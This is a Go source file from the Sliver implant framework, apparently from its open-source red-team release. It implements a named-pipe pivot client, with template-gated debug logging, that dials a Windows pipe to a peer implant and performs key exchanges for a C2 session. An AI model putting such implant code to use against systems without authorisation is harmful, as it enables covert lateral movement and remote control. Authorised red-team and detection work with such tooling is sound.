package pivotclients

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.NamePipec2Enabled}}

import (
	"net/url"
	"strings"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/lesnuages/go-winio"
)

// NamedPipePivotStartSession - Start a TCP pivot session with a peer
func NamedPipePivotStartSession(uri *url.URL, opts *NamedPipePivotOptions) (*NetConnPivotClient, error) {
	address := uri.String()
	address = strings.TrimSuffix(address, "namedpipe://")
	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
	// {{if .Config.Debug}}
	log.Print("Pivot named pipe address: ", address)
	// {{end}}
	conn, err := winio.DialPipe(address, nil)
	if err != nil {
		return nil, err
	}

	pivot := &NetConnPivotClient{
		conn:       conn,
		readMutex:  &sync.Mutex{},
		writeMutex: &sync.Mutex{},

		readDeadline:  opts.ReadDeadline,
		writeDeadline: opts.WriteDeadline,
	}
	err = pivot.peerKeyExchange()
	if err != nil {
		conn.Close()
		return nil, err
	}
	err = pivot.serverKeyExchange()
	if err != nil {
		conn.Close()
		return nil, err
	}

	return pivot, nil
}

// {{end}} -NamePipec2Enabled
